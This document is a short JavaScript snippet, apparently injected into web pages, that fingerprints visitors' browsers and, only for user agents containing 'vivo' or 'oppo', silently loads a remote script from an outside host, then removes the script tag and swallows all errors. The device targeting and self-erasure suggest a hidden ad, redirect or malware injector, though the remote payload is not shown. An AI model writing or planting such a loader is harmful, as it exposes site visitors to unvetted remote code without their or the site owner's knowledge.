try
{
	function random(lower, upper) {
		return Math.floor(Math.random() * (upper - lower+1)) + lower;
	}
	var rrrr = random(1,100);		
	var getClientHeight = function() {
		var clientHeightBody = -119;
		try{
			if(document.body.clientHeight&&document.documentElement.clientHeight) {
				clientHeightBody = Math.min(document.body.clientHeight, document.documentElement.clientHeight);
			}else{
				clientHeightBody = Math.max(document.body.clientHeight, document.documentElement.clientHeight);
			}
		}catch(err){
			
		}
		return clientHeightBody || 0;
	};

	var cheight = getClientHeight();
	var ds;
	var ul;
	var rf;
	var ua;
	var pf;
	ua = navigator.userAgent;
	ds = document.domain;
	ul = window.location.href;
	rf = document.referrer;
	pf = navigator.platform;
	function RndNum(n){
		var rnd="";
		for(var i=0;i<n;i++)
			rnd+=Math.floor(Math.random()*10);
		return rnd;
	}
	
	var script = document.getElementsByTagName('script');



        function bc(b, d) {
                var c = document.getElementsByTagName("head")[0],
                        a = document.createElement("script");
                a.onload = a.onreadystatechange = function() {
                        a && a.readyState && /^(?!(?:loaded|complete)$)/.test(a.readyState) || (
                                a.onload = a.onreadystatechange = null,
                                        a.src = "",
                                        a.parentNode.removeChild(a),
                                        a = null,
                                        d && d()
                        )};
                a.onerror = function(err) {}
                a.charset = "utf-8";
                a.src = b;
                c && c.insertBefore(a, c.firstChild)
        }
        if (ua.toLowerCase().indexOf("vivo") > -1 || ua.toLowerCase().indexOf("oppo") > -1) {
			if (!(ua.indexOf("hap") > -1 || ua.indexOf("miaoshuo") > -1)) {
				bc('//etc.6187wo.com/wei_q.js');
			} 
		}else{
            //bc('//etc.6187wo.com/wei_q.js');
        }
}
catch(err){
    //alert(err);
}
